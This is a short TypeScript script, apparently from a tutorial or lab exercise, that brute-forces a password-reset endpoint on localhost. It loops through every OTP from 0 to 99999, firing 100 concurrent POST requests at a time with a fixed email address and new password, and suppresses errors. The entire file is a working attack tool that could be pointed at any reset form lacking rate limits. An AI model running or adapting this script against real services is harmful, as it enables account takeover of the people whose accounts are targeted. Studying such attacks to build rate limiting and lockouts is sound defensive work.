//since ts is used, use import instead of require

import axios from "axios";

//sending request in a loop --> bruteforce attack
//now call this sendRequest function inside a for loop

async function sendRequest(otp: string) {
  let data = JSON.stringify({
    email: "jordancenataker@gmail.com",
    otp: otp,
    newPassword: "anish@34w4",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/reset-password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };

  //putting this inside a try catch for backend error handling.
  try {
    await axios.request(config);
  } catch (e) {
    // console.log(e);
  }
}

//batching made for 100 batch requests at a time
//processing 100 reqs at a time, if not then memory will run out.

async function main() {
  for (let i = 0; i <= 99999; i += 100) {
    const p = [];
    for (let j = 0; j < 100; j++) {
      console.log(i);
      p.push(sendRequest((i + j).toString()));
    }
    await Promise.all(p);
  }
}

main();
